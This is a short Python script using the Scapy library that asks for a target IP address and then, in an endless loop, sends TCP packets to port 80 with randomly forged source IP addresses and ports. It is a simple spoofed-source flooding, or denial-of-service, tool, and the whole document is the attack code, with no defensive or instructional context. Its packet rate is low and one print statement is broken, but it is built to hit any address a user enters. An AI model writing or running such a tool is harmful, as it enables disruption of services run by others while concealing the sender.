#!/usr/bin/python3

import random
from scapy.all import *

target_ip = input("Enter the target IP: ")

# Loop counter variable
i=0

while True: 

	# Create random octect values
	octet1 = str(random.randint(1,254))
	octet2 = str(random.randint(1,254))
	octet3 = str(random.randint(1,254))
	octet4 = str(random.randint(1,254))

	dot = "."
	source_ip = octet1+dot+octet2+dot+octet3+dot+octet4

	print(source_ip)

	# Generate a random starting port number
	start_port = random.randint(1,1000)

	# Generate a random ending port number
	end_port = random.randint(1000,65535)

	loop_break = 0
  
	for srcport in range(start_port,end_port): 
		IP1 = IP(src=source_ip, dst=target_ip)
		TCP1 = TCP(sport=srcport, dport=80)
		pkt = IP1 / TCP1
		send(pkt,inter= 2)
		print("Packet sent "), i
		loop_break = loop_break+1
		i=i+1
		if loop_break == 1 :
			break


